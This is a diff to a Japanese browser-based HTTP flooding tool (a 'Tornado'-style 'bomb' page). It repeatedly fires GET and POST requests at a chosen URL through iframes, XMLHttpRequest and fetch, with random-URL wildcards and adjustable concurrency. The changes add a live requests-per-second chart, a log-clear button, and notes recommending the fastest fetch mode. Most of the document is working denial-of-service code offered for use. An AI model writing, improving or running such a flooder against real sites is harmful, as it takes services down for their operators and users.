@@ -12,6 +12,8 @@
   gtag('config', 'G-N339EH4J47');
 </script>
 
+<script type="text/javascript" src="smoothie.js"></script>
+
 <script language="JavaScript">
 
 	var m_toDoing;
@@ -32,6 +34,8 @@
 	var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
 	var IsUrlVaild;
 	var IsPostdataVaild;
+	var IsRandH, Nowdate, rps, Nowdate2;
+
 
 	//変数の一斉定義(boonv3.7から流用)--------------------------------------------
 
@@ -401,6 +405,7 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 	function goBomb() 
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//ifFrame更新
@@ -418,24 +423,30 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 			xhr.send((convurl(1)));
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 3 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb()", m_inInterval);
 	}
 
 	function goBomb_GET_ONLY() 
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//ifFrame更新
 			m_ifFrame[i].setAttribute("src", bomb);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_GET_ONLY()", m_inInterval);
 	}
 
 	function goBomb_wildurl()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1)
@@ -453,18 +464,23 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 			xhr.send((convurl(1)));
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 3 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_wildurl()", m_inInterval);
 	}
 
 	function goBomb_wildurl_GET_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1)
 			m_ifFrame[i].setAttribute("src", bomb_url);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_wildurl_GET_ONLY()", m_inInterval);
 	}
 
@@ -472,6 +488,7 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 	{
 		var bomb = m_stBomburl;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//ifFrame（窓）更新
@@ -490,12 +507,15 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 3 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_nowild()", m_inInterval);
 	}
 
 function goBomb_nowild_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//ifFrame（窓）更新
@@ -503,6 +523,8 @@ function goBomb_nowild_GET_ONLY()
 
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_nowild_GET_ONLY()", m_inInterval);
 	}
 
@@ -511,6 +533,7 @@ function goBomb_nowild_GET_ONLY()
 	{
 		var postdata = postdata_from_user;
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1)
@@ -528,12 +551,15 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send(postdata);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 3 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_nowild_wildurl()", m_inInterval);
 	}
 
 	function goBomb_nowild_wildurl_GET_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1)
@@ -541,6 +567,8 @@ function goBomb_nowild_GET_ONLY()
       
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing = setTimeout("goBomb_nowild_wildurl_GET_ONLY()", m_inInterval);
 	}
 
@@ -575,6 +603,7 @@ function goBomb_nowild_GET_ONLY()
 	function goBomb_XML()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -592,12 +621,15 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send((convurl(1)));
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
 	}
 
 	function goBomb_XML_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -611,12 +643,15 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.send();
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_GET_ONLY()", m_inInterval);
 	}
 
 	function goBomb_XML_POST_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
  			//XMLHttpRequest_POST
@@ -625,12 +660,15 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send((convurl(1)));
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_POST_ONLY()", m_inInterval);
 	}
 
 	function goBomb_XML_wildurl()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -649,12 +687,15 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send((convurl(1)));
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_wildurl()", m_inInterval);
 	}
 
 	function goBomb_XML_wildurl_GET_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -669,12 +710,15 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.send();
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_wildurl_GET_ONLY()", m_inInterval);
 	}
 
 	function goBomb_XML_wildurl_POST_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1)
@@ -684,6 +728,8 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send((convurl(1)));
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_wildurl_POST_ONLY()", m_inInterval);
 	}
 
@@ -691,6 +737,7 @@ function goBomb_nowild_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -708,12 +755,15 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send(postdata);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_nowild()", m_inInterval);
 	}	
 
 	function goBomb_XML_nowild_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -727,6 +777,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.send();
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_nowild_GET_ONLY()", m_inInterval);
 	}
 
@@ -734,6 +786,7 @@ function goBomb_nowild_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
  			//XMLHttpRequest_POST
@@ -742,6 +795,8 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send(postdata);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_nowild_POST_ONLY()", m_inInterval);
 	}		
 
@@ -749,6 +804,7 @@ function goBomb_nowild_GET_ONLY()
 	{
 		var postdata = postdata_from_user;
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -767,12 +823,15 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send(postdata);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_nowild_wildurl()", m_inInterval);
 	}
 
 	function goBomb_XML_nowild_wildurl_GET_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//XMLHttpRequest
@@ -787,6 +846,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.send();
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_nowild_wildurl_GET_ONLY()", m_inInterval);
 	}
 
@@ -794,6 +855,7 @@ function goBomb_nowild_GET_ONLY()
 	{
 		var postdata = postdata_from_user;
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1)
@@ -803,6 +865,8 @@ function goBomb_nowild_GET_ONLY()
 			xhr.send(postdata);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_XML = setTimeout("goBomb_XML_nowild_wildurl_POST_ONLY()", m_inInterval);
 	}
 
@@ -838,6 +902,7 @@ function goBomb_nowild_GET_ONLY()
 	function goBomb_fetch()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
@@ -848,12 +913,15 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
 	}
 
 	function goBomb_fetch_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
@@ -861,12 +929,15 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY()", m_inInterval);
 	}
 
 	function goBomb_fetch_POST_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fech POST
@@ -874,12 +945,15 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY()", m_inInterval);
 	}
 	
 	function goBomb_fetch_wildurl()
 	{
 		var bomb_url;
+		Nowdate = Date.now()
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1);
@@ -891,12 +965,15 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl()", m_inInterval);
 	}
 
 	function goBomb_fetch_wildurl_GET_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1);
@@ -905,12 +982,15 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY()", m_inInterval);
 	}
 
 	function goBomb_fetch_wildurl_POST_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1);
@@ -919,6 +999,8 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY()", m_inInterval);
 	}
 
@@ -926,6 +1008,7 @@ function goBomb_nowild_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
@@ -936,12 +1019,15 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild()", m_inInterval);
 	}
 
 	function goBomb_fetch_nowild_GET_ONLY()
 	{
 		var bomb = m_stBomburl;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
@@ -949,6 +1035,8 @@ function goBomb_nowild_GET_ONLY()
 			fetch(req);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY()", m_inInterval);
 	}
 
@@ -956,6 +1044,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 	{
 		var bomb = m_stBomburl;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fech POST
@@ -963,6 +1052,8 @@ function goBomb_fetch_nowild_POST_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY()", m_inInterval);
 	}
 
@@ -971,6 +1062,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 	{
 		var bomb_url;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1);
@@ -982,12 +1074,15 @@ function goBomb_fetch_nowild_POST_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum * 2 / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl()", m_inInterval);
 	}
 
 	function goBomb_fetch_nowild_wildurl_GET_ONLY()
 	{
 		var bomb_url;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1);
@@ -996,6 +1091,8 @@ function goBomb_fetch_nowild_POST_ONLY()
 			fetch(req);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY()", m_inInterval);
 	}
 
@@ -1003,6 +1100,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 	{
 		var bomb_url;
 		var postdata = postdata_from_user;
+		Nowdate = Date.now();
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb_url = convurl_url(1);
@@ -1011,11 +1109,14 @@ function goBomb_fetch_nowild_POST_ONLY()
 			fetch(req2);
 		}
 		bombCounter();
+		Nowdate2 = Date.now();
+		rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY()", m_inInterval);
 	}
 
 	async function stopBomb_fetch()
 	{
+		rps = 0;
 		for(i = 0; i < count; i++) {
 			clearTimeout(m_toDoing_fetch);
 		}
@@ -1025,6 +1126,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 
 	async function stopBomb_XML()
 	{
+		rps = 0;
 		for(i = 0; i < count; i++) {
 			clearTimeout(m_toDoing_XML);
 		}
@@ -1034,6 +1136,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 
 	async function stopBomb_normal()
 	{
+		rps = 0;
 		for(i = 0; i < count; i++) {
 			clearTimeout(m_toDoing);
 		}
@@ -1071,6 +1174,37 @@ function goBomb_fetch_nowild_POST_ONLY()
 		}
 	}
 
+	function LogClear() {
+		var elem = document.getElementById("m_taInfo");
+		elem.innerText="";
+		document.all.m_taInfo.value="";
+		document.all.m_taInfo.value += "※ここに情報が表示されます。";
+	}
+
+	function graphLoad() {
+	var smoothie = new SmoothieChart({
+	grid: { strokeStyle:'rgb(125, 0, 0)', fillStyle:'rgb(60, 0, 0)',
+			lineWidth: 1, millisPerLine: 250, verticalSections: 6, },
+	labels: { fillStyle:'rgb(60, 0, 0)' }
+  });
+	smoothie.streamTo(document.getElementById("mycanvas"));
+	// Data
+	var line1 = new TimeSeries();
+	//var line2 = new TimeSeries();
+	
+	// Add a random value to each line every second
+	setInterval(function() {
+	  line1.append(Date.now(), rps);
+	 // line2.append(Date.now(), Math.random());
+	}, 1000);
+	
+	// Add to SmoothieChart
+	smoothie.addTimeSeries(line1,
+	{ strokeStyle:'rgb(0, 255, 0)', fillStyle:'rgba(0, 255, 0, 0.4)', lineWidth:3 });
+	//smoothie.addTimeSeries(line2, { strokeStyle:'rgb(255, 0, 255)', fillStyle:'rgba(255, 0, 255, 0.3)', lineWidth:3 });
+	smoothie.streamTo(document.getElementById("mycanvas"), 1000 /*delay*/); 
+  
+  }
 
 </script>
 
@@ -1294,16 +1428,16 @@ details[open] .summary_inner::after {
 }
 
 
-}
-
 
 </style>
 
 <body class="backgroundcolor"  style="font-size: 35;" >
 
 <div id="particles-js"></div>
+<!--
 <script src="particles.js"></script>
 <script src="app.js"></script>
+-->
 
 <h1>ﾈ申【トルネード三式・乙】風<br>(modified by DNSりふ)</h1>
 <b>2006.07.23版</b><br>
@@ -1574,7 +1708,7 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
     <details>
       <summary>
         <span class="summary_inner">
-          [訪問モードについて]<span class="icon"></span>
+			<font color="red">[必読][開始ボタンについて]</font><span class="icon"></span>
         </span>
       </summary>
       <div class="content">   
@@ -1591,8 +1725,9 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
           <b>[開始3]</b>
           <li>fetch apiを用いて訪問します。</li>
           <li>訪問速度で言えば一番高性能ですが上記の開始2と同じような制約を受けます。</li>
+		  <li><mark><font color="red">Android/Chromebookで『Chrome Dev』を使っている人と他のPCユーザはこれを推奨します。</font></mark></li>
 	 <br> 
-	 <mark><b><font color="red">仕様上、開始2と開始3は開始1と違い訪問用の窓が開きません。</font></b></mark>
+	 <mark><b>仕様上、開始2と開始3は開始1と違い訪問用の窓が開かないので注意</b></mark>
         </ul>
       </div>
     </details>
@@ -1605,7 +1740,7 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
     <details>
       <summary>
         <span class="summary_inner">
-          <font color="red">[Wildカード一覧]</font><span class="icon"></span>
+          <font color="lime">[Wildカード一覧]</font><span class="icon"></span>
         </span>
       </summary>
       <div class="content">   
@@ -1661,6 +1796,41 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
   </div>
 </div>
 
+<div class="wrapper">
+	<div class="wrapper_normalIcon">
+	  <details>
+		<summary>
+		  <span class="summary_inner">
+			[砲弾処理レートについて]<span class="icon"></span>
+		  </span>
+		</summary>
+		<div class="content">
+				  <ul>
+					  <li>単位時間当たりどれくらい送信処理が出来ているかリアルタイムで表示します。。</li>
+					  <li>まあ、雰囲気的な物であまり意味はないです。</li>
+				  </ul>
+			  </div>
+	  </details>
+	</div>
+  </div>
+
+  <div class="wrapper">
+	<div class="wrapper_normalIcon">
+	  <details>
+		<summary>
+		  <span class="summary_inner">
+			[ログクリアボタンについて]<span class="icon"></span>
+		  </span>
+		</summary>
+		<div class="content">
+				  <ul>
+					  <li>【情報欄】の履歴を削除します。</li>
+				  </ul>
+			  </div>
+	  </details>
+	</div>
+  </div>
+
 
 <br>
 <div style="text-align: center; padding: 10px; margin-bottom: 10px; border: 5px double #333333; border-radius: 10px; font-size: 35; background-color: black; opacity: 0.74;">
@@ -1694,22 +1864,26 @@ Wildcard:<input type="checkbox" name="wcc" style="transform: scale(1.5);" title=
 <br>
 
 <b>【同時更新数】</b>（窓数）<br>
-<input class="css-button-rounded--black" type="text" size="10" name="m_tbWinNum" value="20"><br>
+<input class="css-button-rounded--black" type="text" size="10" name="m_tbWinNum" value="15"><br>
 <br>
 <b>[発射ボタン]</b>
 <br>
+<input class="css-button-rounded--black" type="button" value="開始1" onclick="main();"><input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();"><input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><br><input class="css-button-rounded--black" type="button" style="color: red;" value="中止" onclick="stopBomb_fetch();stopBomb_normal();stopBomb_XML()">
+<input class="css-button-rounded--black" type="button" value="ログクリア" style="color: yellow;" onclick="LogClear();">
 
-<input class="css-button-rounded--black" type="button" value="開始1" onclick="main();"><input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();"><input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><input class="css-button-rounded--black" type="button" value="中止" onclick="stopBomb_fetch();stopBomb_normal();stopBomb_XML()"> <br>
-
-<br>
-<b>【情報】</b><br>
+<br><br>
+<b>【砲弾処理レート】</b><br>
+<canvas class="css-button-rounded--black" id="mycanvas" width="800" height="200" style="border:1px solid #000000;height:200px;width:90%; font-size: 14; color: lime; position: relative; text-align: center;"></canvas>
+<br><b>【情報】</b><br>
 <textarea class="css-button-rounded--black" id="m_taInfo" style="border:1px solid #000000;height:200px;width:90%; font-size: 9; color: lime;">※ここに情報が表示されます。</textarea>
 </form>
 <div id="m_dvMado">
 </div>
 </div>
 </body>
-
-
+</html>
+<script>
+graphLoad();
+</script>
 
 
